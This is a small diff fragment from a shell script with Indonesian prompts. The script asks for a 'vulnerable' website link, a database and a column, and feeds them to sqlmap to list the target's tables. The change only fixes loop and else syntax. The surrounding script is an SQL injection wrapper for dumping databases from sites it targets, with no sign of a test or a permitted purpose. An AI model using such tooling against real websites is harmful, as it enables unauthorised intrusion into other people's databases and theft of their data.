@@ -57,8 +57,7 @@ read -p "Masukkan Link atau Web Yang Error (VULN): " cardinger
 			2) exit
 			;;
 		esac
-		done
-		else
+	done
 read -p "Ketikkan Table Yang Akan Di Buka: " tabled
 ./sqlmap.py -u $cardinger -D $tabled --tables
 read -p "Ketikkan Column Yang Akan Di Buka: " columed
